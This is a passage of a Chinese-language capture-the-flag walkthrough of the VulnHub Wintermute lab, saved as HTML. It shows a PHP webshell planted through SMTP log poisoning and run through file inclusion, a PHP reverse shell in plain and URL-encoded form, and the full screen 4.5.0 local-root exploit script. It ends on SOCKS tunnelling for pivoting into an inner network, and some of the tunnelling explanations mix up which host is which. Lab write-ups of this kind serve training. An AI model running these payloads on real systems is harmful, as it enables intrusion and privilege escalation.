class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2936</span>]: disconnect from unknown[<span class="number">192.168.1.240</span>] ehlo=<span class="number">1</span> starttls=<span class="number">1</span> commands=<span class="number">2</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2937</span>]: connect from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2937</span>]: SSL_accept error from unknown[<span class="number">192.168.1.240</span>]: lost connection</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2937</span>]: lost connection after STARTTLS from unknown[<span class="number">192.168.1.240</span>]</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span> straylight postfix/smtpd[<span class="number">2937</span>]: disconnect from unknown[<span class="number">192.168.1.240</span>] ehlo=<span class="number">1</span> starttls=<span class="number">0</span>/<span class="number">1</span> commands=<span class="number">1</span>/<span class="number">2</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">19</span>:<span class="number">44</span> straylight postfix/anvil[<span class="number">2931</span>]: statistics: max connection rate <span class="number">9</span>/<span class="number">60</span>s for (smtp:<span class="number">192.168.1.240</span>) at Nov <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">19</span>:<span class="number">44</span> straylight postfix/anvil[<span class="number">2931</span>]: statistics: max connection count <span class="number">4</span> for (smtp:<span class="number">192.168.1.240</span>) at Nov <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">24</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">23</span> <span class="number">18</span>:<span class="number">19</span>:<span class="number">44</span> straylight postfix/anvil[<span class="number">2931</span>]: statistics: max cache size <span class="number">1</span> at Nov <span class="number">23</span> <span class="number">18</span>:<span class="number">16</span>:<span class="number">16</span></span><br><span class="line"><span class="attribute">Nov</span> <span class="number">24</span> <span class="number">00</span>:<span class="number">22</span>:<span class="number">33</span> straylight postfix/postfix-script[<span class="number">746</span>]: starting the Postfix mail system</span><br><span class="line"><span class="attribute">Nov</span> <span class="number">24</span> <span class="number">00</span>:<span class="number">22</span>:<span class="number">33</span> straylight postfix/master[<span class="number">748</span>]: daemon started -- version <span class="number">3</span>.<span class="number">1</span>.<span class="number">8</span>, configuration /etc/postfix</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">连接stmp服务器，然后发邮件，在收件人写入命令执行的代码  </span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"> nc 192.168.1.108 25</span></span><br><span class="line"><span class="language-xml"> EHLO 命令：用于标识客户端，并获取 SMTP 服务的支持信息。  helo anonymous</span></span><br><span class="line"><span class="language-xml"> MAIL FROM 命令:指定发件人的邮件地址mail from: &quot;anonymous </span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="language-xml">&quot;    //这里用eval传不了</span></span><br><span class="line"><span class="language-xml"> RCPT TO 命令：指定收件人的邮件地址 rcpt to: root  //这里的收信人必须是已知的，其他的我想不出来直接用root了</span></span><br><span class="line"><span class="language-xml"> DATA 命令：开始输入邮件内容。 data 123456   输入.结束输入</span></span><br><span class="line"><span class="language-xml"> 发生成功</span></span><br><span class="line"><span class="language-xml"> http://192.168.1.108/turing-bolo/bolo.php?bolo=../../../../var/log/mail&amp;cmd=pwd  //所有在日志文件里的命令执行都要用&amp;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-19wintermute-v1//image-20241124175522429.png" alt="image-20241124175522429"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">接下来反弹shell， php -r &#x27;$sock<span class="operator">=</span>fsockopen(<span class="string">&quot;192.168.1.240&quot;</span><span class="punctuation">,</span><span class="number">1234</span>)<span class="comment">;system(&quot;/bin/sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;  需要用php的函数来执行</span></span><br><span class="line">需要进行url编码，php<span class="variable">%20</span>-r<span class="variable">%20</span>&#x27;<span class="variable">%24</span>sock<span class="variable">%3</span>Dfsockopen(<span class="variable">%22192</span>.<span class="number">168.1</span>.<span class="number">240</span><span class="variable">%22</span><span class="variable">%2</span>C<span class="number">1234</span>)<span class="variable">%3</span>Bsystem(<span class="variable">%22</span><span class="variable">%2</span>Fbin<span class="variable">%2</span>Fsh<span class="variable">%20</span><span class="variable">%3</span>C<span class="variable">%263</span><span class="variable">%20</span><span class="variable">%3</span>E<span class="variable">%263</span><span class="variable">%202</span><span class="variable">%3</span>E<span class="variable">%263</span><span class="variable">%22</span>)<span class="variable">%3</span>B&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-19wintermute-v1//image-20241124190310461.png" alt="image-20241124190310461"></p>
+<p><img src="/vulnhub-19wintermute-v1//image-20241124185959811.png" alt="image-20241124185959811"></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获得交互式<span class="keyword">shell</span> <span class="keyword">python</span> -<span class="keyword">c</span> <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">寻找Setuid 权限的文件  <span class="built_in">find</span> / -perm <span class="number">-4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span>一共找到了这么多能够提权的文件，一个个搜了搜，最后发现screen<span class="number">-4.5</span><span class="number">.0</span>它有漏洞（DC<span class="number">-5</span>也是这样提权）</span><br><span class="line">也可以上传LinEnum查找Linux系统有什么能够提权的地方</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-19wintermute-v1//image-20241124192110927.png" alt="image-20241124192110927"></p>
+<p><img src="/vulnhub-19wintermute-v1//image-20241124192442298.png" alt="image-20241124192442298"></p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="meta"># screenroot.sh</span></span><br><span class="line"><span class="meta"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="meta"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="meta"># bug: https:<span class="comment">//lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span></span><br><span class="line"><span class="meta"># HACK THE PLANET</span></span><br><span class="line"><span class="meta"># ~ infodox (25/1/2017)</span></span><br><span class="line">echo <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line">echo <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line">cat <span class="params">&lt;&lt; EOF &gt;</span> <span class="keyword">/tmp/</span>libhax.c  <span class="comment">//第一步</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)<span class="punctuation">&#123;</span></span><br><span class="line">    chown(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">0</span>, <span class="number">0</span>)<span class="punctuation">;</span></span><br><span class="line">    chmod(<span class="string">&quot;/tmp/rootshell&quot;</span>, <span class="number">04755</span>)<span class="punctuation">;</span></span><br><span class="line">    unlink(<span class="string">&quot;/etc/ld.so.preload&quot;</span>)<span class="punctuation">;</span></span><br><span class="line">    printf(<span class="string">&quot;[+] done!\n&quot;</span>)<span class="punctuation">;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o <span class="keyword">/tmp/</span>libhax.so <span class="keyword">/tmp/</span>libhax.c  <span class="comment">//第二步</span></span><br><span class="line">rm -f <span class="keyword">/tmp/</span>libhax.c</span><br><span class="line">cat <span class="params">&lt;&lt; EOF &gt;</span> <span class="keyword">/tmp/</span>rootshell.c   <span class="comment">//第三步</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">int main(void)<span class="punctuation">&#123;</span></span><br><span class="line">    setuid(<span class="number">0</span>)<span class="punctuation">;</span></span><br><span class="line">    setgid(<span class="number">0</span>)<span class="punctuation">;</span></span><br><span class="line">    seteuid(<span class="number">0</span>)<span class="punctuation">;</span></span><br><span class="line">    setegid(<span class="number">0</span>)<span class="punctuation">;</span></span><br><span class="line">    execvp(<span class="string">&quot;/bin/sh&quot;</span>, NULL, NULL)<span class="punctuation">;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">EOF</span><br><span class="line">gcc -o <span class="keyword">/tmp/</span>rootshell <span class="keyword">/tmp/</span>rootshell.c  <span class="comment">//第四步</span></span><br><span class="line">rm -f <span class="keyword">/tmp/</span>rootshell.c</span><br><span class="line">echo <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line">cd /etc  <span class="comment">//第五部</span></span><br><span class="line">umask <span class="number">000</span> <span class="meta"># because  <span class="comment">//第六部</span></span></span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="meta"># newline needed  <span class="comment">//第七部</span></span></span><br><span class="line">echo <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="meta"># screen itself is setuid, so...  <span class="comment">//第八部</span></span></span><br><span class="line"><span class="keyword">/tmp/</span>rootshell  <span class="comment">//第九部</span></span><br><span class="line">现在跟着脚本一步步来，首先给这里面  <span class="keyword">/tmp/</span>libhax.c和<span class="keyword">/tmp/</span>rootshell.c写EOF之前的，其次编译<span class="number">2</span>个C程序，接着cd /etc，再umask <span class="number">000</span>然后screen -D -m -L ld.so.preload echo -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span>，再screen -ls，最后<span class="keyword">/tmp/</span>rootshell</span><br><span class="line">权限不够不能直接执行.sh只能这样一步步来，直接复制粘贴到命令行里就行了，不要管报错</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-19wintermute-v1//image-20241124194534847.png" alt="image-20241124194534847"></p>
+<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获得交互式shell   python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">把root</span>密码改<span class="built_in">成root</span>，然后多弹一些www-data权限，su<span class="built_in"> root</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="接着对内网二层设备进行渗透测试"><a href="#接着对内网二层设备进行渗透测试" class="headerlink" title="接着对内网二层设备进行渗透测试"></a>接着对内网二层设备进行渗透测试</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="使用Neo-regeorg的端口转发"><a href="#使用Neo-regeorg的端口转发" class="headerlink" title="使用Neo-regeorg的端口转发"></a>使用Neo-regeorg的端口转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">机器里没有nmap也没有arp-scan 这里可以用sh也可以提前搭端口转发</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 255); <span class="keyword">do</span> <span class="keyword">if</span> ping -c 1 -w 1 192.168.230.<span class="variable">$i</span>&amp;&gt;/dev/null; <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;192.168.230.<span class="variable">$i</span>&quot;</span>;  <span class="keyword">fi</span> ; <span class="keyword">done</span></span><br><span class="line">这里确认ip为192.168.230.2</span><br><span class="line">在这里我们用的转发工具为Neo-regeorg</span><br><span class="line">1.生成shell文件，连接密码是123456  python neoreg.py generate -k 123456</span><br><span class="line">2.上传tunnel.php到/var/www/html目录下   http://192.168.1.108/tunnel.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-19wintermute-v1//image-20241124201230712.png" alt="image-20241124201230712"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">3</span>.接着要连shell了  python neoreg.py -k <span class="number">123456</span> -u http://<span class="number">192.168.1.108</span>/tunnel.php -p <span class="number">4444</span></span><br><span class="line"><span class="attribute">4</span>.通过Proxifier设置全局的socket5代理</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
+
+<p><img src="/vulnhub-19wintermute-v1//image-20241124202526959.png" alt="image-20241124202526959"></p>
+<p><img src="/vulnhub-19wintermute-v1//image-20241124202637577.png" alt="image-20241124202637577"></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现在通过浏览器就可以访问<span class="number">192.168.230.2</span>了</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用EarthWorm的端口转发（推荐）"><a href="#使用EarthWorm的端口转发（推荐）" class="headerlink" title="使用EarthWorm的端口转发（推荐）"></a>使用EarthWorm的端口转发（推荐）</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">为了设置kali也能访问二层内网设备，就请出EarthWorm简称叫做<span class="literal">EW</span>，它是一套便携式的网络工具，具有SOCKS5服务架设和端口转发两大核心功能，并且包含着LCX工具的功能，可以再复杂的网络环境实现网络穿透，<span class="literal">EW</span>可以已正向和方向以及多级级联的方式建立网络隧道。内网渗透，我只喜欢它！！！</span><br><span class="line">把ew_for_linux64放kali上</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">/ew_for_linux64</span> <span class="string">-s</span> <span class="string">lcx_tran</span> <span class="string">-l</span> <span class="number">1100</span> <span class="string">-f</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.108</span> <span class="string">-g</span> <span class="number">2000</span></span><br><span class="line"><span class="string">以上意思是，将目标服务器的2000端口转发到我们攻击机的1100端口，然后访问攻击机的1100端口，即可连接目标服务器的2000端口</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">示例1</span> <span class="string">利用earthworm反向代理进行内网横向渗透</span></span><br><span class="line"><span class="string">./ew_for_linux64</span> <span class="string">-s</span> <span class="string">rcsocks</span> <span class="string">-l</span> <span class="number">1101</span> <span class="string">-e</span> <span class="number">8888</span><span class="string">在攻击机本地开启1080和8888监听端口，并将1080端口收到的流量转发至8888端口。</span></span><br><span class="line"><span class="string">./ew</span> <span class="string">-s</span> <span class="string">rssocks</span> <span class="string">-d</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.241</span> <span class="string">-e</span> <span class="number">8888</span>  <span class="string">在靶机A上传earthworm,并运行这个命令连接攻击机的8888端口</span></span><br><span class="line"><span class="string">在攻击机上修改全局代理软件proxychains的配置文件，默认路径为/etc/proxychains4.conf，配置socks5代理地址和端口</span>  <span class="string">socks5</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1101</span></span><br><span class="line"></span><br><span class="line"><span class="string">详解：：：</span></span><br><span class="line"><span class="string">攻击机端的命令：</span></span><br><span class="line"><span class="string">bash</span></span><br><span class="line"><span class="string">./ew_for_linux64</span> <span class="string">-s</span> <span class="string">rcsocks</span> <span class="string">-l</span> <span class="number">1101</span> <span class="string">-e</span> <span class="number">8888</span></span><br><span class="line"><span class="string">./ew_for_linux64</span> <span class="string">是</span> <span class="string">Earthworm</span> <span class="string">工具的可执行文件，-s</span> <span class="string">rcsocks</span> <span class="string">表示启动一个反向</span> <span class="string">SOCKS</span> <span class="string">代理（即攻击机作为代理服务器）。</span></span><br><span class="line"><span class="string">-l</span> <span class="number">1101</span> <span class="string">表示本地监听端口</span> <span class="number">1101</span><span class="string">。这个端口将会接收来自外部的流量。</span></span><br><span class="line"><span class="string">-e</span> <span class="number">8888</span> <span class="string">表示将监听端口</span> <span class="number">1101</span> <span class="string">收到的流量转发到攻击机的端口</span> <span class="number">8888</span><span class="string">。</span></span><br><span class="line"><span class="string">简而言之，这个命令设置了攻击机上的本地端口</span> <span class="number">1101</span> <span class="string">和</span> <span class="number">8888</span><span class="string">。攻击机会通过端口</span> <span class="number">1101</span> <span class="string">接收流量，并将其转发到</span> <span class="number">8888</span> <span class="string">端口上。</span></span><br><span class="line"></span><br><span class="line"><span class="string">靶机A端的命令：</span></span><br><span class="line"><span class="string">bash</span></span><br><span class="line"><span class="string">./ew</span> <span class="string">-s</span> <span class="string">rssocks</span> <span class="string">-d</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.241</span> <span class="string">-e</span> <span class="number">8888</span></span><br><span class="line"><span class="string">./ew</span> <span class="string">是</span> <span class="string">Earthworm</span> <span class="string">工具的另一个可执行文件，-s</span> <span class="string">rssocks</span> <span class="string">表示启动一个反向</span> <span class="string">SOCKS</span> <span class="string">代理客户端（即靶机A作为代理客户端）。</span></span><br><span class="line"><span class="string">-d</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.241</span> <span class="string">表示连接到攻击机（IP</span> <span class="string">为</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.241</span><span class="string">）的</span> <span class="number">8888</span> <span class="string">端口。</span></span><br><span class="line"><span class="string">-e</span> <span class="number">8888</span> <span class="string">表示将连接到攻击机</span> <span class="number">8888</span> <span class="string">端口，建立一个反向代理隧道。</span></span><br><span class="line"><span class="string">这个命令启动了靶机A上的代理客户端，指示靶机A连接到攻击机上的</span> <span class="number">8888</span> <span class="string">端口，并将流量通过该端口转发。</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="string">.</span> <span class="string">为什么是反向代理？</span></span><br><span class="line"><span class="string">在这里，反向代理是指通过攻击机设置的端口转发隧道，靶机A</span> <span class="string">扮演了代理客户端的角色，将流量从靶机B（内部网络的靶机）转发到攻击机的外部端口。具体来说：</span></span><br><span class="line"></span><br><span class="line"><span class="string">攻击机：提供一个反向代理（通过</span> <span class="string">rcsocks</span> <span class="string">和端口</span> <span class="number">1101</span><span class="string">），将流量从内网目标（靶机B）引导到外部网络。</span></span><br><span class="line"><span class="string">靶机A：通过连接攻击机的</span> <span class="number">8888</span> <span class="string">端口，接收并转发流量，实际上它充当了代理中介，将流量从内网传递到攻击机上。</span></span><br><span class="line"><span class="string">反向代理是指流量的源头（靶机A）并不是直接访问目标（靶机B），而是通过攻击机的代理服务器转发流量。这样就实现了“反向”的代理模式，攻击机充当了流量的中转站。</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span><span class="string">.</span> <span class="string">端口转发过程</span></span><br><span class="line"><span class="string">端口转发的实现是通过以下方式：</span></span><br><span class="line"></span><br><span class="line"><span class="string">攻击机的端口</span> <span class="number">1101</span> <span class="string">接收来自外部的流量。</span></span><br><span class="line"><span class="string">该流量通过攻击机的端口</span> <span class="number">8888</span> <span class="string">转发给靶机A。</span></span><br><span class="line"><span class="string">靶机A</span> <span class="string">在执行相应命令后，通过自身的代理客户端将流量发送给靶机B，从而实现内网的攻击。</span></span><br><span class="line"><span class="string">总结来说，你描述的过程实际上是通过</span> <span class="string">反向代理</span> <span class="string">和</span> <span class="string">端口转发</span> <span class="string">连接了攻击机、靶机A</span> <span class="string">和靶机B，借助工具在不同的端口之间传递数据，最终实现了通过攻击机对内网靶机B的访问。</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">示例2</span> <span class="string">使用earthworm多级代理进行内网横向渗透</span> <span class="string">本示例中靶机A(192.168.1.3&amp;&amp;192.168.2.3)</span> <span class="string">攻击机(192.168.1.2)，靶机B(192.168.2.2&amp;&amp;192.168.3.2)和C(192.168.3.3)</span></span><br><span class="line"><span class="string">注意：某些条件下，内网某些服务器无法访问互联网，需通过级联的方式将可访问互联网的主机作为一级代理连接攻击机，二级代理连接一级代理主机即可形成通信隧道，攻击机可通过级联的方式将攻击流量转发至更深入的内网。</span></span><br><span class="line"><span class="string">./ew</span> <span class="string">-s</span> <span class="string">lcx_listen</span> <span class="string">-l</span> <span class="number">1101</span> <span class="string">-e</span> <span class="number">8888</span><span class="string">在攻击机上运行如下命令，可在攻击机本地开启1101和8888监听端口，并将1101端口收到的流量转发至8888端口。</span></span><br><span class="line"><span class="string">./ew</span> <span class="string">-s</span> <span class="string">ssocksd</span> <span class="string">-l</span> <span class="number">9999</span>  <span class="string">在靶机A上运行这个命令，可开启9999端口的正向代理。</span></span><br><span class="line"><span class="string">./ew</span> <span class="string">-s</span> <span class="string">lcx_slave</span> <span class="string">-d</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> <span class="string">-e</span> <span class="number">8888</span> <span class="string">-f</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.2</span> <span class="string">-g</span> <span class="number">9999</span>   <span class="string">在靶机A上运行如下命令，同时连接攻击机的反向代理端口和靶机B的正向代理端口。</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">.</span> <span class="string">命令：./ew</span> <span class="string">-s</span> <span class="string">lcx_listen</span> <span class="string">-l</span> <span class="number">1101</span> <span class="string">-e</span> <span class="number">8888</span></span><br><span class="line"><span class="string">这条命令在攻击机上运行，主要作用是设置</span> <span class="string">本地端口监听</span> <span class="string">和</span> <span class="string">端口转发。具体来说：</span></span><br><span class="line"></span><br><span class="line"><span class="string">-s</span> <span class="string">lcx_listen：指定模式为</span> <span class="string">监听端口并转发流量。</span></span><br><span class="line"><span class="string">-l</span> <span class="number">1101</span><span class="string">：本地监听端口为</span> <span class="number">1101</span><span class="string">，即攻击机上的</span> <span class="number">1101</span> <span class="string">端口将监听来自其他主机的连接请求。</span></span><br><span class="line"><span class="string">-e</span> <span class="number">8888</span><span class="string">：将监听到的流量从</span> <span class="number">1101</span> <span class="string">端口转发到攻击机的</span> <span class="number">8888</span> <span class="string">端口。</span></span><br><span class="line"><span class="string">因此，当攻击机的</span> <span class="number">1101</span> <span class="string">端口收到数据时，这些数据会被转发到攻击机本地的</span> <span class="number">8888</span> <span class="string">端口。这种转发机制常用于端口映射或流量中转，可以将流量从一个端口转发到另一个端口，常见于代理或隧道配置中。</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span><span class="string">.</span> <span class="string">命令：./ew</span> <span class="string">-s</span> <span class="string">ssocksd</span> <span class="string">-l</span> <span class="number">9999</span></span><br><span class="line"><span class="string">这条命令在</span> <span class="string">靶机A</span> <span class="string">上运行，开启了一个</span> <span class="string">正向代理</span> <span class="string">服务：</span></span><br><span class="line"></span><br><span class="line"><span class="string">-s</span> <span class="string">ssocksd：指定服务为</span> <span class="string">SOCKS</span> <span class="string">代理，即将靶机A作为</span> <span class="string">SOCKS</span> <span class="string">代理服务器运行。</span></span><br><span class="line"><span class="string">-l</span> <span class="number">9999</span><span class="string">：设置</span> <span class="string">SOCKS</span> <span class="string">代理监听端口为</span> <span class="number">9999</span><span class="string">。</span></span><br><span class="line"><span class="string">在这种模式下，靶机A将充当一个正向代理服务器，监听</span> <span class="number">9999</span> <span class="string">端口，允许其他主机通过该代理进行网络请求，通常是为了绕过防火墙、隐藏真实IP、或进行网络流量转发。</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span><span class="string">.</span> <span class="string">命令：./ew</span> <span class="string">-s</span> <span class="string">lcx_slave</span> <span class="string">-d</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> <span class="string">-e</span> <span class="number">8888</span> <span class="string">-f</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.2</span> <span class="string">-g</span> <span class="number">9999</span></span><br><span class="line"><span class="string">这条命令在</span> <span class="string">靶机A</span> <span class="string">上运行，目的是同时连接攻击机的</span> <span class="string">反向代理端口</span> <span class="string">和靶机B的</span> <span class="string">正向代理端口。它具体做了以下操作：</span></span><br><span class="line"></span><br><span class="line"><span class="string">-s</span> <span class="string">lcx_slave：指定模式为</span> <span class="string">从属模式，通常这个模式是指连接到一个上级代理或反向代理。</span></span><br><span class="line"><span class="string">-d</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span><span class="string">：目标地址，指定要连接的</span> <span class="string">靶机B</span> <span class="string">的</span> <span class="string">IP</span> <span class="string">地址（可能是某个受害者主机）。</span></span><br><span class="line"><span class="string">-e</span> <span class="number">8888</span><span class="string">：指定要通过该连接使用的端口。这里指的是靶机B的</span> <span class="number">8888</span><span class="string">端口。</span></span><br><span class="line"><span class="string">-f</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.2</span><span class="string">：指定另一个要连接的目标地址，通常是</span> <span class="string">攻击机的地址。</span></span><br><span class="line"><span class="string">-g</span> <span class="number">9999</span><span class="string">：指定要连接的</span> <span class="string">攻击机端口，即前述提到的攻击机上的正向代理端口</span> <span class="number">9999</span><span class="string">。</span></span><br><span 